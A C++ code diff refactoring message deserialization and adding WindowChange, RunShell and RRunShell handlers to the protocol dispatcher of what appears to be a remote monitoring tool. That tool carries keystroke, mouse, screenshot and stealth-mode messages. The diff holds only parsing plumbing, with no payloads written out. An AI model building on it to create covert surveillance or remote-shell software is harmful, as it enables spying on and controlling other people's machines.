@@ -71,6 +71,12 @@ namespace spi
                     return proto::RActiveMode::SerializedSize;
                 case proto::MessageType::RScreenshot:
                     return proto::RScreenshot::SerializedSize;
+                case proto::MessageType::WindowChange:
+                    return proto::WindowChanged::SerializedSize;
+                case proto::MessageType::RunShell:
+                    return proto::RunShell::SerializedSize;
+                case proto::MessageType::RRunShell:
+                    return proto::RRunShell::SerializedSize;
                 default:
                     return invalidSize;
             }
@@ -112,8 +118,9 @@ namespace spi
         const std::unordered_map<proto::MessageType::EnumType, HandlerT> _handlers{
             {
                 proto::MessageType::ReplyCode, [&](proto::MessageType type, const Buffer &v) {
-                proto::ReplyCode rep(v);
+                proto::ReplyCode rep;
 
+                rep << v;
                 _cbs[type](rep);
             }},
             {
@@ -124,38 +131,44 @@ namespace spi
             }},
             {
                 proto::MessageType::RawData, [&](proto::MessageType type, const Buffer &v) {
-                proto::RawData rd(v);
+                proto::RawData rd;
 
+                rd << v;
                 _cbs[type](rd);
             }},
             {
                 proto::MessageType::Hello, [&](proto::MessageType type, const Buffer &v) {
-                proto::Hello ehlo(v);
+                proto::Hello ehlo;
 
+                ehlo << v;
                 _cbs[type](ehlo);
             }},
             {
                 proto::MessageType::KeyEvent,  [&](proto::MessageType type, const Buffer &v) {
-                proto::KeyEvent ke(v);
+                proto::KeyEvent ke;
 
+                ke << v;
                 _cbs[type](ke);
             }},
             {
                 proto::MessageType::MouseClick, [&](proto::MessageType type, const Buffer &v) {
-                proto::MouseClick mc(v);
+                proto::MouseClick mc;
 
+                mc << v;
                 _cbs[type](mc);
             }},
             {
                 proto::MessageType::MouseMove, [&](proto::MessageType type, const Buffer &v) {
-                proto::MouseMove mm(v);
+                proto::MouseMove mm;
 
+                mm << v;
                 _cbs[type](mm);
             }},
             {
                 proto::MessageType::ImageData, [&](proto::MessageType type, const Buffer &v) {
-                proto::ImageData img(v);
+                proto::ImageData img;
 
+                img << v;
                 _cbs[type](img);
             }},
             {
@@ -184,28 +197,53 @@ namespace spi
             }},
             {
                 proto::MessageType::RListReply, [&](proto::MessageType type, const Buffer &v) {
-                proto::RListReply rlr(v);
+                proto::RListReply rlr;
 
+                rlr << v;
                 _cbs[type](rlr);
             }},
             {
                 proto::MessageType::RStealthMode, [&](proto::MessageType type, const Buffer &v) {
-                proto::RStealthMode rep(v);
+                proto::RStealthMode rep;
 
+                rep << v;
                 _cbs[type](rep);
             }},
             {
                 proto::MessageType::RActiveMode, [&](proto::MessageType type, const Buffer &v) {
-                proto::RActiveMode rep(v);
+                proto::RActiveMode rep;
 
+                rep << v;
                 _cbs[type](rep);
             }},
             {
                 proto::MessageType::RScreenshot, [&](proto::MessageType type, const Buffer &v) {
-                proto::RScreenshot rep(v);
+                proto::RScreenshot rep;
 
+                rep << v;
                 _cbs[type](rep);
             }},
+            {
+                proto::MessageType::WindowChange, [&](proto::MessageType type, const Buffer &v) {
+                proto::WindowChanged rep;
+
+                rep << v;
+                _cbs[type](rep);
+            }},
+            {
+                proto::MessageType::RunShell, [&](proto::MessageType type, const Buffer &v) {
+                proto::RunShell rep;
+
+                rep << v;
+                _cbs[type](rep);
+            }},
+            {
+                proto::MessageType::RRunShell, [&](proto::MessageType type, const Buffer &v) {
+                proto::RRunShell rep;
+
+                rep << v;
+                _cbs[type](rep);
+            }}
         };
 
         std::unordered_map<proto::MessageType::EnumType, MessageCallbackT> _cbs;
